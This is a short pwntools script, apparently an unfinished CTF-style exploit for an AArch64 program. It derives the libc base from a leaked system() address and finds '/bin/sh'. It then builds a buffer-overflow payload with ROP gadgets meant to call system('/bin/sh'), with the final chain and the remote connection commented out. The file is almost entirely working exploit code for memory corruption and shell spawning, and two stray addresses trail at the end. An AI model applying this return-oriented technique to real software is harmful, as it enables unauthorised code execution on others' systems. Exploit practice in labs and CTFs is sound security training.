from pwn import *

# p = remote("localhost",9000)
libc = ELF("libc.so.6")
# p.recvuntil(" system @")
# addr = int(p.recv(len("0x40000089a660")).decode(),16)
# p.clean()

# print(hex(addr))

addr = 0x55018e6d94
libc.address =  addr - libc.sym["system"]
BIN_SH = libc.address + 0x146fd0 

# 0x000000000002a3a8: ldp x21, x22, [sp, #0x20]; ldp x29, x30, [sp], #0x40; ret; 
# 0x0000000000050cf8 : mov x0, x21 ; blr x22
ldp_x21_x22_ldp_x29_x30 = libc.address + 0x000000000002a3a8
mov_x0_x21_blr_x22 = libc.address + 0x0000000000050cf8 



payload =  b"A" * 24
payload += p64(ldp_x21_x22_ldp_x29_x30) # 0x30
payload += cyclic(200)
# 
# payload += cyclic(200)
# payload += p64(BIN_SH)
# payload += p64(0)
# payload += p64(mov_x0_x21_blr_x22)
# payload += cyclic(100)
# payload += p64(addr)

open("x.bin","wb").write(payload)
# p.interactive()

0x55018527b8
0x5501852754